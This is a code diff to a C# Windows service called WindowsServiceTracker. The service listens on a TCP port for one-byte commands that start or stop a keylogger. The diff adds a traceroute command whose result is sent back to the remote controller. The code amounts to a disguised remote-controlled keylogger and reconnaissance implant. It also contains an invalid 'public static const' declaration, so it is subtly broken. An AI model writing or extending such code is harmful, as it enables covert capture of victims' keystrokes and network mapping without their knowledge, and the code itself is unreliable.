@@ -27,6 +27,9 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
+        public static const byte KEYLOG_ON = 0;
+        public static const byte KEYLOG_OFF = 1;
+        public static const byte TRACE_ROUTE = 2;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
@@ -246,11 +249,14 @@ namespace WindowsServiceTracker
                             else {
                                 switch (buffer[0])
                                 {
-                                    case 0:
+                                    case KEYLOG_ON:
                                         StartKeylogger();
                                         break;
-                                    case 1:
+                                    case KEYLOG_OFF:
                                         StopKeylogger();
+                                        break;
+                                    case TRACE_ROUTE:
+                                        sendTraceRouteInfo();
                                         break;
                                     default:
                                         break;
@@ -316,6 +322,18 @@ namespace WindowsServiceTracker
             if (tcpStream != null && tcpStream.CanWrite)
             {
                 byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
+                tcpStream.Write(msg, 0, msg.Length);
+                return true;
+            }
+            return false;
+        }
+
+        private bool sendTraceRouteInfo()
+        {
+            String ipString = traceRoute(ipAddressString);
+            if (tcpStream != null && tcpStream.CanWrite)
+            {
+                byte[] msg = Encoding.UTF8.GetBytes(TRACE_ROUTE + ipString + Environment.NewLine);
                 tcpStream.Write(msg, 0, msg.Length);
                 return true;
             }
